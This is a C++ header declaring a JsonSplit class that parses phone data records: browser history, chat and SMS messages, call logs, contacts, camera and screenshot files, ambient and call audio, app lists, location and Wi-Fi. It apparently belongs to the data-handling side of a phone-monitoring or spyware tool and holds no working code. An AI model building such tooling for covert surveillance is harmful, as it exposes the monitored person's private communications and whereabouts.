#pragma once

#include <iostream>

using namespace std;

class JsonSplit {
public:
	static int JsonSplit::splitBrowserRecord(string data, 
		string &type, string & ts, string & title, string &url, string & count, string &ctime);

	static int JsonSplit::splitChatMessage(string data, string &people, string &message, string &timenow,
		string &type, string &group, string &package);
	static int JsonSplit::splitMessage(string data, string &number, string &content, string &type, string &timenow, string &ID);
	static int JsonSplit::splitCallLog(string data, string &type, string &number,string &time,string &duration);
	static int JsonSplit::splitContacts(string data,string &name, string &num);

	static int JsonSplit::splitCamera(string filename, string &timenow);

	static int JsonSplit::splitScreenShot(string filename, string &timenow);

	static int JsonSplit::splitEnvAudioName(string name, string &timenow);
	static int splitCallAudioName(string name, string &number, string &timenow, string &type);

	static int JsonSplit::splitRunningApps(string data, string & pname, string & pid, string &uid, string &lru, string &description);
	static int splitInstallApps(string data, string & name, string &packagename, string &setuptime, string &lastupdatetime, string &ver,string & type);

	static int splitLocation(string data, string & lat, string & lon, string &pos,string &timenow,string & address);

	static int splitWifi(string data, string & name, string & bssid, string &time);

	static string slitInfomation(string &info,string &model);
};